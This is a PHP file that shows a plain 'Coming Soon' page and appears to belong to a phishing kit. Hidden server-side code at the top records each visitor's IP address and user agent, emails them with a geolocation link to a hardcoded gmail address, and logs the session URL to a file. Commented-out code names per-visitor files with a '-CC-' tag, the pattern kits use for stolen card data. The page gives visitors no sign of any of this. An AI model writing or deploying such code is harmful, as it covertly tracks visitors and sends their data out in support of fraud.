<?php

session_start();
 

// Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;

// Get user IP address

$to = 'hamady.gharib2021@gmail.com';
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$subject = "$ip\n";

$headers = "From: App-micro <hn.pro.961@gmail.com>\r\n" ;


$body .= "From ; $ip | http://www.geoiptool.com/?IP=$ip   \n";
$body .= $_SERVER['HTTP_USER_AGENT'];
$rnessage = "$body\n";
mail($to, $subject, $body , $headers);


$file_to_write = "$ip-CC-".date("m-d-Y-g-i-s").".txt";
$content_to_write = "
=======================
URL :  ".$_SESSION['url']."
=======================
".$_SERVER['HTTP_USER_AGENT']."
".date ("m-d-Y")."||".date ("g:i:s")."
=====================================================================";
	$f = fopen("map", "a");
	fwrite($f, $content_to_write);
		fclose($f);
/*
if( is_dir($dir) === false )
{
    mkdir($dir);
}

$file = fopen($dir . '/' . $file_to_write,"w");

// a different way to write content into
// fwrite($file,"Hello World.");

fwrite($file,$content_to_write);

*/
//echo "$ip";

?>
<!doctype html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Coming Soon</title>
    <meta name="description" content="Coming Soon">
    <link rel="icon" href="fav.ico">
    <link href="https://unpkg.com/tailwindcss@^2.0/dist/tailwind.min.css" rel="stylesheet">
    <style>
        .header,
        button {
            background-color: #2d3748;
            background-image: url("data:image/svg+xml,%3Csvg width='52' height='26' viewBox='0 0 52 26' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23000000' fill-opacity='0.1'%3E%3Cpath d='M10 10c0-2.21-1.79-4-4-4-3.314 0-6-2.686-6-6h2c0 2.21 1.79 4 4 4 3.314 0 6 2.686 6 6 0 2.21 1.79 4 4 4 3.314 0 6 2.686 6 6 0 2.21 1.79 4 4 4v2c-3.314 0-6-2.686-6-6 0-2.21-1.79-4-4-4-3.314 0-6-2.686-6-6zm25.464-1.95l8.486 8.486-1.414 1.414-8.486-8.486 1.414-1.414z' /%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
        }
    </style>
</head>

<body class="antialiased bg-gray-200">
    <div class="p-4 bg-gray-800 md:mb-8 header">
        <div
            class="text-center max-w-4xl mx-auto text-white text-xl md:text-2xl uppercase font-bold tracking-wider animate-pulse">
            Coming soon</div>
    </div>
    <div class="max-w-4xl mx-auto bg-white shadow overflow-hidden rounded-lg mb-3">
        <div class="px-4 py-5 sm:px-6 font-semibold border-b border-gray-200"></div>
        <div class="bg-gray-100 px-4 py-5 sm:p-6 sm:flex">
               <center> <p class="mb-2 font-mono text-xs text-gray-700 flex items-center">
                    <svg class="w-5 h-5 mr-1 opacity-75" fill="none" stroke="currentColor" viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207">
                        </path>
                    </svg>
                    Email: hn.pro.961@gmail.com
                </p>
            </center>
            </div>
        </div>
    </div>
</body>

</html>